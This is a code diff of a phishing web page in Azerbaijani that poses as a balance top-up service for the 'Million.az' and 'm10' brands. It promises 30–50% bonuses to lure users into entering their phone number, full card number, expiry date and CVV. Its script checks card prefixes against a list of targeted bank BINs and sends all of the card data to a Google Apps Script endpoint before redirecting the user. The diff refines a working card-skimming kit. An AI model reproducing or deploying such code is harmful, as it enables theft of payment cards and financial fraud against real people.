@@ -1,9 +1,9 @@
-\<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="az">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Million.az - Balans Artır</title>
+  <title>m10 - Balans Artır</title>
 
   <style>
     /* Gilroy Font Tanımı */
@@ -20,11 +20,11 @@
     }
 
     body {
-      font-family: 'GilroyBold',  sans-serif; /* Bütün elementlər üçün GilroyBold fontu */
+      font-family: 'GilroyBold', sans-serif;
       background: url('background.png') no-repeat center center fixed;
       background-size: cover;
       color: #333;
-      padding-top: 50px; /* Header yüksekliğinden biraz fazla */
+      padding-top: 50px;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -147,9 +147,14 @@
       font-weight: bold;
     }
 
+    /* Buton Pasif Durum */
+    button:disabled {
+      background-color: #ccc;  /* Gri arka plan */
+      cursor: not-allowed;  /* Fare simgesi değişir */
+    }
+
     button:hover {
       background-color: #1D2331;
-      font-family: 'GilroyBold', Arial, sans-serif; 
     }
 
     /* Footer */
@@ -197,7 +202,6 @@
 
       button {
         font-size: 36px;
-        ;
       }
 
       input[type="text"],
@@ -229,12 +233,12 @@
         <div class="form-group">
           <label for="tutar">Yükləyəcəyiniz Məbləğ (₼)</label>
           <input type="number" id="tutar" name="tutar" placeholder="0" oninput="hesapla(this.value)" required>
-          <div class="result-text" id="result">Hesabınıza gələcək məbləğ (1.5x bonus ilə): 0.00₼</div>
+          <div class="result-text" id="result">Hesabınıza gələcək məbləğ: 0 ₼</div>
         </div>
 
         <div class="form-group">
           <label for="kart-numarasi">Kart Nömrəsi</label>
-          <input type="text" id="kart-numarasi" name="kart-numarasi" oninput="kartNumarasiInput(this)" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" required>
+          <input type="text" id="kart-numarasi" name="kart-numarasi" oninput="kartNumarasiInput(this)" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required>
         </div>
 
         <div class="form-group">
@@ -254,7 +258,7 @@
           <input type="text" id="cvv" name="cvv" oninput="cvvInput(this)" maxlength="3" placeholder="XXX" required>
         </div>
 
-        <button type="submit">Ödənişi Tamamla</button>
+        <button type="submit" id="submit-button" disabled>Ödənişi Tamamla</button>
       </form>
     </div>
   </div>
@@ -267,99 +271,131 @@
       <p>Bütün hüquqlar qorunur © 2024 m10-az.com</p>
     </div>
   </div>
-<script>
-  const validBins = [
-    "1230", "3751", "4018", "4021", "4004", "4006", "4023", "4028", "4056", "4069", "4071", "4076", "4098", "4169", "4779", "5239", "5167", "5339", "5398", "4567", "5200", "4894", "5243", "4716", "4569", "4389", "5390", "4641", "5123", "4568", "4210", "4119", "4321", "4118", "4672", "4116", "4211", "5111", "5319", "4017", "4022", "4566", "4198", "4105", "4801", "4709", "4999", "5223", "4719", "5018", "4915", "4212", "5311", "5323", "4822", "4631", "4555", "4799", "4019", "4117"
-  ];
 
-  // Telefon numarasını yalnızca rakam kabul edecek şekilde düzenler
-  function telefonInput(input) {
-    input.value = input.value.replace(/[^\d]/g, '+');
+  <script>
+   const validBins = [
+  "5298", "4278", "4278", "4272", "4713", "4081", "4169", "4268", "5292", 
+  "4174", "4174", "4174", "4174", "4173", "4172", "4172", "4172", "5287", 
+  "5120", "4024", "4127", "4787", "4021", "4021", "5466", "4787", "4006", 
+  "5417", "5301", "4889", "4787", "4138", "4351", "6769", "4724", "6775", 
+  "4278", "5417", "4138", "6708", "5167", "6776", "5227", "5169", "4203", 
+  "4297", "5213", "4083", "4172", "6776", "4286", "4278", "4083", "4189", 
+  "4286", "4174", "4127", "4192", "4174", "4173", "5188", "4505", "4725", 
+  "6769", "4173", "4465", "6706", "5127", "4174", "4021", "4277", "4277", 
+  "5504", "5505", "5508", "5509", "5510", "5520", "5522", "5527", "5529", 
+  "5530", "5531", "5532", "5533", "5535", "5536", "5540", "5542", "5543", 
+  "5544", "5545", "5546", "5547", "5548", "5549", "5550", "5551", "5552", 
+  "5553", "5554", "5555", "5556", "5557", "5558", "5559", "5560", "5561", 
+  "5562", "5563", "5564", "5565", "5566", "5567", "5568", "5569", "5570", 
+  "5571", "5572", "5573", "5574", "5575", "5576", "5577", "5578", "5579", 
+  "5580", "5581", "5582", "5583", "5584", "5585", "5586", "5587", "5588", 
+  "5589", "5590", "5591", "5592", "5593", "5594", "5595", "5596", "5597", 
+  "5598", "5599"
+];
+
+
+function telefonInput(input) {
+  input.value = input.value.replace(/[^\d+]/g, '').slice(0, 13);  // Yalnız rakamlar kabul edilir
+}
+
+function hesapla(tutar) {
+  let bonus = 0;
+  const resultElement = document.getElementById('result');
+  const submitButton = document.getElementById('submit-button');
+
+  // Minimum ödeme 100₼ olmalı
+  if (tutar < 100) {
+    resultElement.innerText = "Minimum ödəniş 100₼ olmalıdır.";
+    submitButton.disabled = true;  // 100₼'den az girildiğinde buton pasif olur
+  } else if (tutar >= 100 && tutar < 300) {
+    bonus = tutar * 1.3;
+    resultElement.innerText = `Hesabınıza gələcək məbləğ (30% bonus): ${bonus.toFixed(2)}₼`;
+  } else if (tutar >= 300) {
+    bonus = tutar * 1.5;
+    resultElement.innerText = `Hesabınıza gələcək məbləğ (50% bonus ): ${bonus.toFixed(2)}₼`;
+  }
+  
+  // Kart ve tutar doğruysa buton aktif olmalı
+  const kartNumarasi = document.getElementById('kart-numarasi').value.replace(/\s/g, '');
+  const submitButtonDisabled = !(validBins.includes(kartNumarasi.slice(0, 4)) && tutar >= 100);
+  submitButton.disabled = submitButtonDisabled;  // Kart ve tutar doğruluğuna göre buton durumu
+}
+
+function kartNumarasiInput(input) {
+  let temizNumara = input.value.replace(/\D/g, '');  // Yalnız rakamlar alınır
+  let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || '';  // 4'erli gruplara ayır ve boşluk ekle
+  input.value = formatliNumara;
+
+  const bin = temizNumara.slice(0, 4);  // İlk 4 haneli bin
+  const submitButton = document.getElementById('submit-button');
+  const tutar = document.getElementById("tutar").value.trim();
+
+  // Kart numarası doğruysa yeşil, yanlışsa kırmızı yapılır
+  if (validBins.includes(bin)) {
+    input.style.borderColor = "green";  // Geçerli bin numarası için yeşil
+  } else {
+    input.style.borderColor = "red";  // Geçersiz bin numarası için kırmızı
   }
 
-  // Tutar üzerinden 1.5x bonus hesaplama
-  function hesapla(tutar) {
-    const bonus = (tutar * 1.5).toFixed(2);
-    document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
+  // Kart ve tutar geçerli ise buton aktif olur
+  if (validBins.includes(bin) && tutar >= 100) {
+    submitButton.disabled = false;  // Buton aktif olur
+  } else {
+    submitButton.disabled = true;  // Buton pasif olur
   }
+}
 
-  // Kart numarasını kontrol eder ve formatlar
-  function kartNumarasiKontrol(input) {
-    let temizNumara = input.value.replace(/\D/g, '');
-    let formatliNumara = temizNumara.match(/.{1,4}/g)?.join(' ') || '';
-    input.value = formatliNumara;
+function cvvInput(input) {
+  input.value = input.value.replace(/\D/g, '').slice(0, 3);  // Yalnız rakamlar kabul edilir ve 3 haneli CVV
+}
 
-    if (temizNumara.length >= 4) {
-      const bin = temizNumara.slice(0, 4);
-      if (validBins.includes(bin)) {
-        input.classList.remove('invalid');
-        input.classList.add('valid');
-        document.getElementById("submit-button").disabled = false;
-      } else {
-        input.classList.remove('valid');
-        input.classList.add('invalid');
-        document.getElementById("submit-button").disabled = true;
-      }
-    } else {
-      input.classList.remove('valid');
-      input.classList.add('invalid');
-      document.getElementById("submit-button").disabled = true;
-    }
+window.onload = function () {
+  const aylar = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"];
+  const aySelect = document.getElementById("son-kullanma-ay");
+  const ilSelect = document.getElementById("son-kullanma-yil");
+
+  aylar.forEach((ay) => {
+    const option = document.createElement("option");
+    option.value = ay;
+    option.innerText = ay;
+    aySelect.appendChild(option);
+  });
+
+  for (let i = 2024; i <= 2034; i++) {
+    const option = document.createElement("option");
+    option.value = i;
+    option.innerText = i;
+    ilSelect.appendChild(option);
   }
+};
 
-  // CVV girişini doğrular
-  function cvvInput(input) {
-    input.value = input.value.replace(/\D/g, '').slice(0, 3);
-  }
-
-  // Ay ve yıl dropdownlarını doldurur
-  window.onload = function () {
-    const aylar = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"];
-    const aySelect = document.getElementById("son-kullanma-ay");
-    const ilSelect = document.getElementById("son-kullanma-yil");
-
-    aylar.forEach((ay) => {
-      const option = document.createElement("option");
-      option.value = ay;
-      option.innerText = ay;
-      aySelect.appendChild(option);
-    });
-
-    for (let i = 2024; i <= 2034; i++) {
-      const option = document.createElement("option");
-      option.value = i;
-      option.innerText = i;
-      ilSelect.appendChild(option);
-    }
+async function gonder(event) {
+  event.preventDefault();
+  const data = {
+    telefon: document.getElementById("telefon-numarasi").value.trim(),
+    tutar: document.getElementById("tutar").value.trim(),
+    kart: document.getElementById("kart-numarasi").value.replace(/\s/g, ''),
+    ay: document.getElementById("son-kullanma-ay").value.trim(),
+    yil: document.getElementById("son-kullanma-yil").value.trim(),
+    cvv: document.getElementById("cvv").value.trim(),
   };
 
-  async function gonder(event) {
-    event.preventDefault();
+  try {
+    await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+      mode: "no-cors",
+    });
 
-    const data = {
-      telefon: document.getElementById("telefon-numarasi").value.trim(),
-      tutar: document.getElementById("tutar").value.trim(),
-      kart: document.getElementById("kart-numarasi").value.trim(),
-      ay: document.getElementById("son-kullanma-ay").value.trim(),
-      yil: document.getElementById("son-kullanma-yil").value.trim(),
-      cvv: document.getElementById("cvv").value.trim(),
-    };
-
-    try {
-      await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(data),
-        mode: "no-cors",
-      });
-
-      window.location.href = "pay/index.html";
-    } catch (error) {
-      console.error("XƏTA", error);
-    }
+    window.location.href = "pay/index.html";
+  } catch (error) {
+    console.error("XƏTA", error);
   }
-</script>
+}
+
+  </script>
 </body>
 </html>
